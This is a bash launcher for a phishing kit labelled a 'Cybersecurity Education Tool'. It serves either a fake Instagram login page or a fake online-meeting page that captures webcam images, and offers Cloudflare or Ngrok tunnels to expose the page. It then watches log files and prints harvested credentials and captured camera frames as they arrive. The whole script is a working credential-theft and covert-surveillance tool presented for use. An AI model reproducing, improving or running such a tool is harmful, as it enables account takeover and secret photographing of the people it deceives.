#!/bin/bash

# --- Color Definitions ---
R='\033[1;31m'  # Red
G='\033[1;32m'  # Green
Y='\033[1;33m'  # Yellow
B='\033[1;34m'  # Blue
P='\033[1;35m'  # Purple
C='\033[1;36m'  # Cyan
W='\033[1;37m'  # White
NC='\033[0m'     # No Color

# Clean Terminal on Start
clear

# --- Bold Professional Branding ---
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${C}TECHYFATCAT ${NC}─ ${W}Cybersecurity Education Tool v2.0${NC}"
echo -e "  ${Y}Developer: ${NC}${G}Aadit Sarhadi${NC} | ${P}CSE 2nd Year${NC}"
echo -e "  ${W}GitHub:    ${NC}${B}techyfatcat${NC}"
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${R}[!] Press CTRL+C to stop the tool at any time${NC}"
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

# --- Main Menu ---
echo -e "${G}Select a Template:${NC}"
echo -e "  ${B}[1]${NC} Instagram (Latest Dark UI)"
echo -e "  ${B}[2]${NC} Online Meeting (Auto-Capture Image)"
read -p "  Selection > " option

echo -e "\n${G}Select Tunneling Method:${NC}"
echo -e "  ${B}[1]${NC} Localhost (Port 8080)"
echo -e "  ${B}[2]${NC} Cloudflare"
echo -e "  ${B}[3]${NC} Ngrok"
read -p "  Selection > " tunnel

# --- Setup Paths & Clean Old Processes ---
if [[ $option == "1" ]]; then
    target_dir="modules/insta"
    log_file="logs/output.txt"
    echo -e "\n${Y}[*] Configuring Instagram Template...${NC}"
elif [[ $option == "2" ]]; then
    target_dir="modules/meeting"
    log_file="logs/cam"
    echo -e "\n${Y}[*] Configuring Meeting Template...${NC}"
else
    echo -e "${R}[!] Invalid Option. Exiting.${NC}"
    exit 1
fi

# Kill any existing PHP server on 8080
fuser -k 8080/tcp > /dev/null 2>&1

# --- Launch Server ---
echo -e "${Y}[*] Starting PHP Server...${NC}"
cd $target_dir
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
echo -e "${G}[+] Server Live at: ${W}http://127.0.0.1:8080${NC}"

# Go back to root for log monitoring
cd ../..

echo -e "${C}[*] Waiting for incoming data...${NC}\n"

# --- Listener Loop ---
while true; do
    if [[ $option == "1" ]]; then
        # Check for Credentials
        if [[ -s logs/output.txt ]]; then
            echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            echo -e "  ${G}[SUCCESS] CREDENTIALS RECEIVED!${NC}"
            cat logs/output.txt
            echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            # Clear file to prevent duplicate alerts
            > logs/output.txt
            echo -e "${Y}[*] Continuing listener...${NC}\n"
        fi
    elif [[ $option == "2" ]]; then
        # Check for Images
        count=$(ls -1 logs/cam/*.png 2>/dev/null | wc -l)
        if [ $count -gt 0 ]; then
            echo -e "  ${C}[IMAGE RECEIVED]${NC} Frame captured and saved in ${W}logs/cam/${NC}"
            # Move to subfolder to acknowledge
            mkdir -p logs/cam/received
            mv logs/cam/*.png logs/cam/received/ 2>/dev/null
        fi
    fi
    sleep 2
done